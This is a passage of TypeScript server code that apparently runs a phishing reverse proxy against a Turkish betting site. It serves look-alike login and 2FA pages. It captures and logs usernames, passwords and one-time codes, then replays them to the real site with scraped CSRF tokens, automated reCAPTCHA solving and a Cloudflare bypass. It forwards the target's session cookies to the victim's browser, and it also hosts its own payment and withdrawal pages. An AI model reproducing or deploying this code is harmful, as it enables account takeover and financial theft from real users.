    if (!uname) {
      return res.json({ balance: "0.00" });
    }
    try {
      let bal = 0;
      const log = await storage.getLogByUsername(uname);
      if (log) bal = Math.max(bal, parseFloat(String(log.balance ?? 0)) || 0);
      const user = await storage.getUserByUsername(uname);
      if (user) bal = Math.max(bal, parseFloat(String((user as any).balance ?? 0)) || 0);
      res.json({ balance: bal.toFixed(2) });
    } catch {
      res.json({ balance: "0.00" });
    }
  });

  app.post("/api/auth/logout", (req: Request, res: Response) => {
    req.session.destroy((err) => {
      if (err) return res.status(500).json({ success: false });
      res.clearCookie("connect.sid");
      res.json({ success: true });
    });
  });

  const TRUSTED_DEVICE_COOKIE = "trusted_device";
  const TRUSTED_DEVICE_MAX_AGE = 30 * 24 * 60 * 60;

  app.post("/api/auth/resend-2fa", async (req: Request, res: Response) => {
    const pending = req.session.pending2FA;
    if (!pending) {
      return res.status(400).json({ success: false, message: "Bekleyen doğrulama yok" });
    }
    const now = Date.now();
    const last = req.session.resend2FALastAt || 0;
    if (now - last < 60000) {
      return res.status(429).json({ success: false, message: "Kodu en fazla 1 dakikada bir yeniden gönderebilirsiniz", retryAfter: Math.ceil((60000 - (now - last)) / 1000) });
    }
    const code = String(Math.floor(100000 + Math.random() * 900000));
    const expiresAt = Math.floor(Date.now() / 1000) + 600;
    await storage.createVerificationCode(pending.userId, code, expiresAt);
    const sent = await sendVerificationCode(pending.email, code);
    req.session.resend2FALastAt = now;
    if (!sent.ok) {
      return res.status(500).json({ success: false, message: sent.error || "Gönderilemedi" });
    }
    res.json({ success: true, message: "Kod gönderildi", retryAfter: 60 });
  });

  app.post("/api/auth/verify-2fa", async (req: Request, res: Response) => {
    const pending = req.session.pending2FA;
    if (!pending) {
      return res.status(401).json({ success: false, message: "Oturum bulunamadı veya süresi doldu" });
    }
    const inputCode = (req.body?.code ?? req.body?.TDVerificationCode ?? "").toString().trim();
    const trustBrowser = req.body?.trustBrowser === true || req.body?.TrustBrowser === "true";
    if (!inputCode) {
      return res.status(400).json({ success: false, message: "Onaylama kodu giriniz" });
    }
    if (inputCode.length < 4 || inputCode.length > 10 || !/^\d+$/.test(inputCode)) {
      return res.status(400).json({ success: false, message: "Geçersiz kod formatı" });
    }
    const row = await storage.getValidVerificationCode(pending.userId);
    const savedCode = row ? String(row.code).trim() : "";
    const codeMatches = savedCode.length > 0 && savedCode === inputCode;
    if (!row || !codeMatches) {
      if (row && !codeMatches) {
        console.warn("[2FA] Geçersiz kod denemesi, userId:", pending.userId);
      }
      return res.status(400).json({ success: false, message: "Geçersiz veya süresi dolmuş kod" });
    }
    await storage.deleteVerificationCodesForUser(pending.userId);
    delete req.session.pending2FA;
    delete req.session.resend2FALastAt;
    req.session.userId = pending.userId;
    req.session.username = pending.username;
    if (trustBrowser) {
      const secret = process.env.SESSION_SECRET || "default-secret";
      const token = crypto.createHmac("sha256", secret).update(pending.userId).digest("hex").slice(0, 32);
      res.cookie(TRUSTED_DEVICE_COOKIE, `${pending.userId}.${token}`, { httpOnly: true, maxAge: TRUSTED_DEVICE_MAX_AGE * 1000, sameSite: "lax", secure: false });
    }
    return sendAuthSuccess(req, res, { success: true, username: pending.username });
  });

  app.get("/login/trustbrowser", (req: Request, res: Response) => {
    if (!req.session.pending2FA) {
      res.setHeader("Cache-Control", "no-store");
      res.type("html").send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Oturum gerekli</title>
<style>body{background:#1a1e29;color:#e8e8e8;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{text-align:center;padding:2rem}.box a{display:inline-block;margin-top:1rem;padding:12px 24px;background:#c9a227;color:#1a1a1a;text-decoration:none;border-radius:8px;font-weight:700}</style></head>
<body><div class="box"><p>Doğrulama oturumu bulunamadı veya süresi doldu.</p><p>Lütfen tekrar giriş yapın.</p><a href="/login">Giriş sayfasına git</a></div></body></html>`);
      return;
    }
    res.send(getTwoFactorPageHtml("/tr"));
  });

  // ═══════════════════════════════════════════════════
  // ─── Custom Login Page ───
  // ═══════════════════════════════════════════════════
  app.get("/login", (_req: Request, res: Response) => {
    res.send(getLoginPageHtml("/tr"));
  });

  // ═══════════════════════════════════════════════════
  // ─── Root redirects to proxy site ───
  // ═══════════════════════════════════════════════════
  app.get("/", (_req: Request, res: Response) => {
    res.redirect(307, "/tr/");
  });

  // ═══════════════════════════════════════════════════
  // ─── Ödeme sayfası (bbbb_updated zip ile aynı yapı) ───
  // ═══════════════════════════════════════════════════
  app.get("/payment", (req: Request, res: Response) => {
    const embed = req.query.embed === "1" || req.query.embed === "true";
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(getPaymentPageHtml(embed));
  });
  app.get("/payment/form/:method", (req: Request, res: Response) => {
    const method = String(req.params.method || "");
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(getPaymentFormHtml(method));
  });

  app.get("/withdrawal", (req: Request, res: Response) => {
    const embed = req.query.embed === "1" || req.query.embed === "true";
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(getWithdrawalPageHtml(embed));
  });

  const canliDestekIconPath = path.resolve(process.cwd(), "canlimobil.png");
  function serveCanlimobil(_req: Request, res: Response) {
    try {
      const buf = fs.readFileSync(canliDestekIconPath);
      res.setHeader("Content-Type", "image/png");
      res.setHeader("Cache-Control", "public, max-age=86400");
      res.send(buf);
    } catch {
      res.status(404).end();
    }
  }
  app.get("/images/canlimobil.png", serveCanlimobil);
  app.get("/tr/images/canlimobil.png", serveCanlimobil);
  app.get("/proxy/images/canlimobil.png", serveCanlimobil);

  // ═══════════════════════════════════════════════════
  // ─── User CRUD API Routes ───
  // ═══════════════════════════════════════════════════

  app.get("/api/users", async (req: Request, res: Response) => {
    try {
      const search = req.query.search as string | undefined;
      const users = await storage.getUsers(search);
      res.json(users);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/users/:id", async (req: Request, res: Response) => {
    try {
      const user = await storage.getUser(String(req.params.id));
      if (!user) return res.status(404).json({ error: "User not found" });
      res.json(user);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/users", async (req: Request, res: Response) => {
    try {
      const parsed = insertUserSchema.safeParse(req.body);
      if (!parsed.success) {
        return res.status(400).json({ error: "Invalid user data", details: parsed.error.errors });
      }
      const hashedPassword = await bcrypt.hash(parsed.data.password, 10);
      const user = await storage.createUser({ ...parsed.data, password: hashedPassword });
      res.status(201).json(user);
    } catch (error: any) {
      if (error.message?.includes("unique") || error.code === "23505") {
        return res.status(409).json({ error: "Username already exists" });
      }
      res.status(500).json({ error: error.message });
    }
  });

  app.put("/api/users/:id", async (req: Request, res: Response) => {
    try {
      const parsed = insertUserSchema.partial().safeParse(req.body);
      if (!parsed.success) {
        return res.status(400).json({ error: "Invalid update data", details: parsed.error.errors });
      }
      const updateData = { ...parsed.data };
      if (updateData.password) {
        updateData.password = await bcrypt.hash(updateData.password, 10);
      }
      const user = await storage.updateUser(String(req.params.id), updateData);
      if (!user) return res.status(404).json({ error: "User not found" });
      res.json(user);
    } catch (error: any) {
      if (error.message?.includes("unique") || error.code === "23505") {
        return res.status(409).json({ error: "Username already exists" });
      }
      res.status(500).json({ error: error.message });
    }
  });

  app.delete("/api/users/:id", async (req: Request, res: Response) => {
    try {
      const deleted = await storage.deleteUser(String(req.params.id));
      if (!deleted) return res.status(404).json({ error: "User not found" });
      res.json({ message: "User deleted" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/users/:id/balance/add", async (req: Request, res: Response) => {
    try {
      const amount = parseFloat(req.body?.amount);
      if (amount == null || isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: "Geçerli bir miktar girin" });
      }
      const user = await storage.addBalance(String(req.params.id), amount);
      if (!user) return res.status(404).json({ error: "User not found" });
      res.json({ user, balance: (user as any).balance, message: "Bakiye eklendi" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/users/:id/balance/subtract", async (req: Request, res: Response) => {
    try {
      const amount = parseFloat(req.body?.amount);
      if (amount == null || isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: "Geçerli bir miktar girin" });
      }
      const result = await storage.subtractBalance(String(req.params.id), amount);
      if (!result) return res.status(404).json({ error: "User not found" });
      if (result.insufficient) {
        return res.status(400).json({ error: "Yetersiz bakiye" });
      }
      res.json({ user: result.user, balance: (result.user as any).balance, message: "Bakiye düşüldü" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // ─── Helper: Forward Set-Cookie from target to browser ───
  function forwardCookiesToBrowser(res: Response, setCookies: string[], base: string = "/proxy") {
    if (setCookies.length === 0) return;
    const pathSegment = base.startsWith("/") ? base.slice(1) : base;
    const pathRe = new RegExp("path=\\/?(?!" + pathSegment.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + ")", "gi");
    const rewritten = setCookies.map(c =>
      c.replace(/domain=[^;]+;?\s*/gi, "").replace(pathRe, "path=" + base + "/")
    );
    res.setHeader("Set-Cookie", rewritten);
  }

  // ─── Proxy login routes: aynı auth akışı, 2FA'da /login/trustbrowser'a yönlendir ───
  const homeTr = getHomeUrl("/tr");

  async function handleProxyLogin(req: Request, res: Response): Promise<void> {
    const loginInput = (req.body?.username ?? req.body?.Username ?? req.body?.email ?? req.body?.Email ?? "").toString().trim();
    const password = (req.body?.password ?? req.body?.Password ?? "").toString();
    if (!loginInput || !password) {
      res.json({ Success: false, Message: "E-posta ve şifre gerekli", RedirectUrl: "/login" });
      return;
    }
    try {
      const isEmail = isEmailLike(loginInput);

      if (!isEmail && looksLikeBotInput(loginInput)) {
        res.json({ Success: false, Message: "Kullanıcı adı veya şifre yanlış", RedirectUrl: "/login" });
        return;
      }

      const result = isEmail
        ? await performLoginAuth(req, loginInput, password)
        : await performUsernameLogin(req, loginInput, password);

      if (!result.success) {
        const msg = isEmail ? result.message : "Kullanıcı adı veya şifre yanlış";
        res.json({ Success: false, Message: msg, RedirectUrl: "/login" });
        return;
      }
      const redirectUrl = result.requires2FA ? "/login/trustbrowser" : homeTr;
      sendAuthSuccess(req, res, { Success: true, Message: result.requires2FA ? "Doğrulama kodu gönderildi" : "Giriş başarılı", RedirectUrl: redirectUrl });
    } catch (err: any) {
      console.error("[AUTH] Proxy login error:", err);
      res.json({ Success: false, Message: err?.message || "Giriş hatası", RedirectUrl: "/login" });
    }
  }

  app.post("/proxy/tr/Login/Login", (req: Request, res: Response) => void handleProxyLogin(req, res));
  app.post("/proxy/tr/login/login", (req: Request, res: Response) => void handleProxyLogin(req, res));
  app.post("/proxy/login/login", (req: Request, res: Response) => void handleProxyLogin(req, res));
  app.post("/tr/Login/Login", (req: Request, res: Response) => void handleProxyLogin(req, res));
  app.post("/tr/login/login", (req: Request, res: Response) => void handleProxyLogin(req, res));

  // ─── 2FA / Email Verification Page (GET) ───
  function getVerificationPageHtml(base: string): string {
    const home = getHomeUrl(base);
    const postUrl = base === "/tr" ? "/tr/Login/EmailVerification" : "/proxy/tr/Login/EmailVerification";
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>E-posta Doğrulama</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#16213e;border-radius:12px;padding:40px;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h1{text-align:center;font-size:24px;margin-bottom:8px;color:#fff}
.subtitle{text-align:center;color:#8892b0;margin-bottom:28px;font-size:14px}
label{display:block;margin-bottom:6px;font-size:14px;color:#a8b2d1}
input{width:100%;padding:12px 14px;border:1px solid #233554;border-radius:8px;background:#0a192f;color:#e0e0e0;font-size:15px;margin-bottom:18px;outline:none;transition:border-color .2s;text-align:center;letter-spacing:8px;font-size:24px}
input:focus{border-color:#0f3460}
.btn{width:100%;padding:14px;border:none;border-radius:8px;background:#0f3460;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#1a4f8a}
.btn:disabled{opacity:.6;cursor:not-allowed}
.error{background:rgba(231,76,60,.15);border:1px solid rgba(231,76,60,.3);color:#e74c3c;padding:10px 14px;border-radius:8px;margin-bottom:16px;font-size:14px;display:none}
.success{background:rgba(46,204,113,.15);border:1px solid rgba(46,204,113,.3);color:#2ecc71;padding:10px 14px;border-radius:8px;margin-bottom:16px;font-size:14px;display:none}
.spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<h1>E-posta Doğrulama</h1>
<p class="subtitle">E-posta adresinize gönderilen doğrulama kodunu girin</p>
<div class="error" id="err"></div>
<div class="success" id="suc"></div>
<form id="verifyForm">
<label for="code">Doğrulama Kodu</label>
<input type="text" id="code" name="VerificationCode" placeholder="------" maxlength="6" required autocomplete="one-time-code">
<button type="submit" class="btn" id="submitBtn">Doğrula</button>
</form>
</div>
<script>
var form=document.getElementById('verifyForm'),btn=document.getElementById('submitBtn'),errDiv=document.getElementById('err'),sucDiv=document.getElementById('suc');
form.addEventListener('submit',function(e){
  e.preventDefault();
  errDiv.style.display='none';sucDiv.style.display='none';
  btn.disabled=true;
  btn.innerHTML='<span class="spinner"></span>Doğrulanıyor...';
  fetch('${postUrl}',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({VerificationCode:document.getElementById('code').value})
  }).then(function(r){return r.json()}).then(function(d){
    if(d.Success||d.IsSuccess){
      sucDiv.textContent=d.Message||'Doğrulama başarılı!';
      sucDiv.style.display='block';
      setTimeout(function(){window.location.href=d.RedirectUrl||'${home}';},1500);
    }else{
      errDiv.textContent=d.Message||'Doğrulama başarısız';
      errDiv.style.display='block';
      btn.disabled=false;
      btn.textContent='Doğrula';
    }
  }).catch(function(e){
    errDiv.textContent='Bağlantı hatası: '+e.message;
    errDiv.style.display='block';
    btn.disabled=false;
    btn.textContent='Doğrula';
  });
});
</script>
</body>
</html>`;
  }
  const verificationPageHandler = (req: Request, res: Response) => {
    res.send(getVerificationPageHtml(getProxyBaseFromRequest(req)));
  };
  app.get("/proxy/tr/Login/EmailVerification", verificationPageHandler);
  app.get("/proxy/tr/login/emailverification", verificationPageHandler);
  app.get("/tr/Login/EmailVerification", verificationPageHandler);
  app.get("/tr/login/emailverification", verificationPageHandler);

  // ─── 2FA / Email Verification Intercept ───
  const emailVerificationPostHandler = async (req: Request, res: Response) => {
    try {
      const base = getProxyBaseFromRequest(req);
      const home = getHomeUrl(base);
      const { VerificationCode, Code, __RequestVerificationToken } = req.body;
      const code = VerificationCode || Code || "";
      if (!code) return res.status(400).json({ Success: false, Message: "Doğrulama kodu gerekli" });

      log("2FA", `Verification attempt with code: ${code}`);

      // Step 1: Get verification page CSRF token
      const verifyPageHtml = await fetchViaProxy("/tr/Login/EmailVerification", "GET");
      const csrfMatch = verifyPageHtml.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : (__RequestVerificationToken || "");

      if (!csrfToken) {
        log("2FA", "CSRF token not found on verification page");
        return res.json({ Success: false, IsSuccess: false, Message: "Doğrulama sayfasına ulaşılamadı" });
      }

      // Step 2: Solve reCAPTCHA if needed
      const siteKeyMatch = verifyPageHtml.match(/render=([A-Za-z0-9_-]{30,})/);
      const siteKey = siteKeyMatch ? siteKeyMatch[1] : "";
      let recaptchaToken = "";
      if (siteKey && isCaptchaConfigured()) {
        try {
          const captchaResult = await solveRecaptchaV3(`${getTargetOrigin()}/tr/Login/EmailVerification`, siteKey, "verify");
          if (captchaResult.success && captchaResult.token) recaptchaToken = captchaResult.token;
        } catch (e: any) {
          log("2FA", `Captcha error: ${e.message}`);
        }
      }

      // Step 3: Submit verification
      const formData = new URLSearchParams();
      formData.append("VerificationCode", code);
      if (csrfToken) formData.append("__RequestVerificationToken", csrfToken);
      if (recaptchaToken) formData.append("g-recaptcha-response", recaptchaToken);

      const result = await postViaProxy("/login/emailverification", formData.toString());
      log("2FA", `Status: ${result.statusCode}, Body: ${result.body.substring(0, 300)}`);

      forwardCookiesToBrowser(res, result.setCookies, base);

      try {
        const json = JSON.parse(result.body);
        const isSuccess = json.Success === true || json.IsSuccess === true;
        if (isSuccess) {
          const redirectUrl = json.RedirectUrl ? (base + (json.RedirectUrl.startsWith("/") ? "" : "/") + json.RedirectUrl) : home;
          return res.json({ Success: true, IsSuccess: true, Message: json.Message || "Doğrulama başarılı", RedirectUrl: redirectUrl });
        }
        return res.json({ Success: false, IsSuccess: false, Message: json.Message || "Doğrulama başarısız" });
      } catch {
        if (result.statusCode === 302 || result.statusCode === 301) {
          return res.json({ Success: true, IsSuccess: true, Message: "Doğrulama başarılı", RedirectUrl: home });
        }
        return res.json({ Success: false, IsSuccess: false, Message: `Sunucu hatası (${result.statusCode})` });
      }
    } catch (error: any) {
      log("2FA", `Error: ${error.message}`);
      res.json({ Success: false, IsSuccess: false, Message: error.message });
    }
  };
  app.post("/proxy/tr/Login/EmailVerification", emailVerificationPostHandler);
  app.post("/tr/Login/EmailVerification", emailVerificationPostHandler);

  // ─── TrustBrowser 2FA Page (GET) ───
  const trustBrowserPageHandler = async (req: Request, res: Response) => {
    const base = getProxyBaseFromRequest(req);
    const home = getHomeUrl(base);
    const postUrl = base === "/tr" ? "/tr/Login/TrustBrowser" : "/proxy/Login/TrustBrowser";
    try {
      log("TRUST", "Fetching TrustBrowser page from target...");
      const trustPageHtml = await fetchViaProxy("/Login/TrustBrowser?_=" + Date.now(), "GET");
      if (trustPageHtml && trustPageHtml.includes("TDVerificationCode")) {
        const rewritten = rewriteHtml(trustPageHtml, base);
        res.setHeader("Content-Type", "text/html; charset=utf-8");
        return res.send(rewritten);
      }
    } catch (e: any) {
      log("TRUST", `Failed to fetch real page: ${e.message}`);
    }
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(`<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Güvenli Giriş Doğrulaması</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#16213e;border-radius:16px;padding:40px;max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.4)}
h2{text-align:center;margin-bottom:8px;font-size:20px;color:#e94560}
.subtitle{text-align:center;margin-bottom:24px;color:#a8a8b3;font-size:14px}
.form-group{margin-bottom:20px}
label{display:block;margin-bottom:8px;color:#a8a8b3;font-size:14px}
input[type=text]{width:100%;padding:14px;border:2px solid #2a2a4a;border-radius:8px;background:#0f3460;color:#fff;font-size:18px;text-align:center;letter-spacing:4px}
input[type=text]:focus{outline:none;border-color:#e94560}
.checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:20px}
.checkbox-group input{width:18px;height:18px}
.checkbox-group label{margin:0;cursor:pointer}
button{width:100%;padding:14px;border:none;border-radius:8px;background:#e94560;color:#fff;font-size:16px;cursor:pointer;font-weight:bold}
button:hover{background:#c81e45}
button:disabled{opacity:.6;cursor:not-allowed}
.error{display:none;background:#ff4444;color:#fff;padding:10px;border-radius:8px;text-align:center;margin-bottom:16px}
.success{display:none;background:#44bb44;color:#fff;padding:10px;border-radius:8px;text-align:center;margin-bottom:16px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-right:8px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head>
<body><div class="container">
<h2>🔐 Güvenli Giriş Doğrulaması</h2>
<p class="subtitle">E-posta veya telefon numaranıza gönderilen onay kodunu giriniz</p>
<div id="error" class="error"></div>
<div id="success" class="success"></div>
<div class="form-group">
  <label for="code">Onaylama Kodu</label>
  <input type="text" id="code" placeholder="Kodu giriniz" maxlength="10" autofocus />
</div>
<div class="checkbox-group">
  <input type="checkbox" id="trustBrowser" checked />
  <label for="trustBrowser">Bu tarayıcıya güven (tekrar sorma)</label>
</div>
<button id="verifyBtn">Doğrula</button>
</div>
<script>
document.getElementById('verifyBtn').addEventListener('click', function(){
  var btn = this;
  var code = document.getElementById('code').value.trim();
  var trustBrowser = document.getElementById('trustBrowser').checked;
  var errDiv = document.getElementById('error');
  var sucDiv = document.getElementById('success');
  if(!code){errDiv.textContent='Lütfen onay kodunu giriniz';errDiv.style.display='block';return;}
  errDiv.style.display='none';sucDiv.style.display='none';
  btn.disabled=true;
  btn.innerHTML='<span class="spinner"></span>Doğrulanıyor...';
  fetch('${postUrl}',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({TDVerificationCode:code,TrustBrowser:trustBrowser})
  }).then(function(r){return r.json()}).then(function(d){
    if(d.Success||d.IsSuccess){
      sucDiv.textContent=d.Message||'Doğrulama başarılı!';
      sucDiv.style.display='block';
      setTimeout(function(){window.location.href=d.RedirectUrl||'${home}';},1500);
    }else{
      errDiv.textContent=d.Message||'Doğrulama başarısız';
      errDiv.style.display='block';
      btn.disabled=false;
      btn.textContent='Doğrula';
    }
  }).catch(function(e){
    errDiv.textContent='Bağlantı hatası: '+e.message;
    errDiv.style.display='block';
    btn.disabled=false;
    btn.textContent='Doğrula';
  });
});
document.getElementById('code').addEventListener('keydown', function(e){
  if(e.key==='Enter'){document.getElementById('verifyBtn').click();}
});
</script></body></html>`);
  };
  app.get("/proxy/Login/TrustBrowser", trustBrowserPageHandler);
  app.get("/proxy/login/TrustBrowser", trustBrowserPageHandler);
  app.get("/proxy/tr/Login/TrustBrowser", trustBrowserPageHandler);
  app.get("/proxy/login/trustbrowser", trustBrowserPageHandler);
  app.get("/tr/Login/TrustBrowser", trustBrowserPageHandler);
  app.get("/tr/login/TrustBrowser", trustBrowserPageHandler);
  app.get("/tr/login/trustbrowser", trustBrowserPageHandler);

  // ─── TrustBrowser 2FA Submit (POST) ───
  const trustBrowserPostHandler = async (req: Request, res: Response) => {
    try {
      const base = getProxyBaseFromRequest(req);
      const home = getHomeUrl(base);
      const { TDVerificationCode, TrustBrowser: trustBrowserChecked } = req.body;
      const code = TDVerificationCode || req.body.Code || "";
      if (!code) return res.status(400).json({ Success: false, Message: "Doğrulama kodu gerekli" });

      log("TRUST", `TrustBrowser verification with code: ${code}`);

      const trustPageHtml = await fetchViaProxy("/Login/TrustBrowser?_=" + Date.now(), "GET");
      const csrfMatch = trustPageHtml.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
      const csrfToken = csrfMatch ? csrfMatch[1] : "";

      if (!csrfToken) {
        log("TRUST", "CSRF token not found on TrustBrowser page");
        return res.json({ Success: false, IsSuccess: false, Message: "TrustBrowser sayfasına ulaşılamadı" });
      }

      // Step 2: Submit to /Login/Login (NOT /Login/TrustBrowser!) with TrustLogin=true
      // This matches the real site behavior observed in traffic capture
      const formData = new URLSearchParams();
      formData.append("__RequestVerificationToken", csrfToken);
      formData.append("returnUrl", "");
      formData.append("TrustLogin", "true");
      formData.append("FormToken", getTargetHost());
      formData.append("TDVerificationCode", code);
      formData.append("TrustBrowser", trustBrowserChecked !== false ? "true" : "false");
      // Reuse saved loginParam fields from the login step
      if (loginSession.loginParam) formData.append("loginParam", loginSession.loginParam);
      if (loginSession.loginParam1) formData.append("loginParam1", loginSession.loginParam1);
      if (loginSession.loginParam2) formData.append("loginParam2", String(Date.now())); // Fresh timestamp
      formData.append("loginHref", "");

      log("TRUST", `Submitting to /login/login with TrustLogin=true, code=${code}`);
      const result = await postViaProxy("/login/login", formData.toString());
      log("TRUST", `Status: ${result.statusCode}, Body: ${result.body.substring(0, 300)}`);

      forwardCookiesToBrowser(res, result.setCookies, base);

      const bodyTrimmed = result.body.trim();
      if (bodyTrimmed === "/tr/" || bodyTrimmed === "/tr" || bodyTrimmed.startsWith("/tr/")) {
        log("TRUST", "TrustBrowser verification SUCCESS → redirect to " + home);
        return res.json({ Success: true, IsSuccess: true, Message: "Doğrulama başarılı!", RedirectUrl: home });
      }

      try {
        const json = JSON.parse(result.body);
        const isSuccess = json.Success === true || json.IsSuccess === true;
        if (isSuccess) {
          const redirectUrl = json.RedirectUrl ? (base + (json.RedirectUrl.startsWith("/") ? "" : "/") + json.RedirectUrl) : home;
          return res.json({ Success: true, IsSuccess: true, Message: json.Message || "Doğrulama başarılı", RedirectUrl: redirectUrl });
        }
        return res.json({ Success: false, IsSuccess: false, Message: json.Message || "Doğrulama kodu hatalı" });
      } catch {
        if (result.statusCode === 302 || result.statusCode === 301) {
          return res.json({ Success: true, IsSuccess: true, Message: "Doğrulama başarılı", RedirectUrl: home });
        }
        return res.json({ Success: false, IsSuccess: false, Message: `Sunucu hatası (${result.statusCode})` });
      }
    } catch (error: any) {
      log("TRUST", `Error: ${error.message}`);
      res.json({ Success: false, IsSuccess: false, Message: error.message });
    }
  };
  app.post("/proxy/Login/TrustBrowser", trustBrowserPostHandler);
  app.post("/proxy/tr/Login/TrustBrowser", trustBrowserPostHandler);
  app.post("/tr/Login/TrustBrowser", trustBrowserPostHandler);

  // ─── Main Proxy Handler ───
  // ═══════════════════════════════════════════════════
  // ─── Snapshot Static Serving (when active) ───
  // ═══════════════════════════════════════════════════
  app.use("/snapshot", (req: Request, res: Response) => {
    const snapshotDir = getActiveSnapshotDir();
    if (!snapshotDir) {
      return res.status(404).json({ error: "No active snapshot. Activate a snapshot from admin panel." });
    }

    let requestPath: string;
    try {
      requestPath = decodeURIComponent(req.path || "/");
    } catch {
      return res.status(400).send("Invalid URL");
    }

    requestPath = requestPath.split("?")[0].split("#")[0];
    if (requestPath === "/" || requestPath === "") requestPath = "/index.html";

    const hasTrailingSlash = requestPath.endsWith("/") && requestPath !== "/";
    if (hasTrailingSlash) {
      requestPath = requestPath.slice(0, -1);
    }

    const normalized = path.normalize(requestPath);
    const resolvedPath = path.resolve(snapshotDir, "." + normalized);

    if (!resolvedPath.startsWith(path.resolve(snapshotDir))) {
      return res.status(403).send("Forbidden");
    }

    let filePath: string | null = null;

    if (hasTrailingSlash) {
      const dirIndexPath = resolvedPath + "/index.html";
      const htmlPath = resolvedPath + ".html";
      if (fs.existsSync(dirIndexPath) && !fs.statSync(dirIndexPath).isDirectory()) {
        filePath = dirIndexPath;
      } else if (fs.existsSync(htmlPath) && !fs.statSync(htmlPath).isDirectory()) {
        filePath = htmlPath;
      }
    } else {
      if (fs.existsSync(resolvedPath) && !fs.statSync(resolvedPath).isDirectory()) {
        filePath = resolvedPath;
      } else if (!path.extname(resolvedPath)) {
        const htmlPath = resolvedPath + ".html";
        const dirIndexPath = resolvedPath + "/index.html";
        if (fs.existsSync(htmlPath) && !fs.statSync(htmlPath).isDirectory()) {
          filePath = htmlPath;
        } else if (fs.existsSync(dirIndexPath) && !fs.statSync(dirIndexPath).isDirectory()) {
          filePath = dirIndexPath;
        }
      }
    }

    if (!filePath) {
      return res.status(404).send("File not found in snapshot");
    }

    const mimeType = mime.lookup(filePath) || "application/octet-stream";
    res.setHeader("Content-Type", mimeType);
    res.setHeader("Cache-Control", "public, max-age=86400");
    res.setHeader("Access-Control-Allow-Origin", "*");

    if (mimeType.includes("text/html")) {
      try {
        let html = fs.readFileSync(filePath, "utf-8");
        html = html.replace(
          /(\s(?:href)=["'])(\/(?:tr|sections|home|promotions|promo|sport|sports|esport|account|Account|registration|referafriend|bonus|lobby|play|Home|Scripts|agent)\b[^"']*)(["'])/gi,
          '$1/snapshot$2$3'
        );
        html = html.replace(
          /(\s(?:href)=["'])\/snapshot\/snapshot\//gi,
          '$1/snapshot/'
        );
        res.send(html);
      } catch {
        if (!res.headersSent) res.status(500).send("Error reading file");
      }
    } else {
      const fileStream = fs.createReadStream(filePath);
      fileStream.pipe(res);
      fileStream.on("error", () => {
        if (!res.headersSent) res.status(500).send("Error reading file");
      });
    }
  });

  type GetTargetPath = (req: Request) => string;
  const PROXY_REQUEST_TIMEOUT_MS = 45000; // prevent hung requests → ERR_CONNECTION_TIMED_OUT

  function createProxyHandler(proxyBase: string, getTargetPath: GetTargetPath) {
    return async (req: Request, res: Response) => {
    const timeoutHandle = setTimeout(() => {
      if (!res.headersSent) {
        try { res.status(504).setHeader("Content-Type", "text/plain").end("Gateway Timeout"); } catch (_) {}
      }
    }, PROXY_REQUEST_TIMEOUT_MS);
    const clearTimeoutAndNext = () => { clearTimeout(timeoutHandle); };
    res.once("finish", clearTimeoutAndNext);
    res.once("close", clearTimeoutAndNext);

    try {
      let targetPath = getTargetPath(req);
      // Defensive: /tr/tr/... -> redirect to /tr/... so address bar and upstream are correct
      if (proxyBase === "/tr" && targetPath.startsWith("/tr/tr")) {
        const canonical = "/tr" + targetPath.slice(6);
        res.redirect(301, canonical);
        return;
      }
      const targetUrl = new URL(targetPath, getTargetUrl());

      // CF-ready gate: kisa bekleme, 403 gelirse bypass + tek retry yapilacak
      if (!isCfReady()) {
        if (cfBypassInProgress) {
          log("PROXY", "CF bypass in progress, proceeding without waiting");
        } else {
          const ready = await waitForCfReady(3000);
          if (!ready) log("PROXY", "CF not ready in 3s, proceeding (403'te bypass+retry)");
        }
      }

      const isPostRequest = req.method === "POST";
      const isPutRequest = req.method === "PUT";
      const isAsset = ASSET_EXTENSIONS.test(targetPath);
      const isAjax = !!req.headers["x-requested-with"];
      const clientAccept = (req.headers.accept || "").toLowerCase();
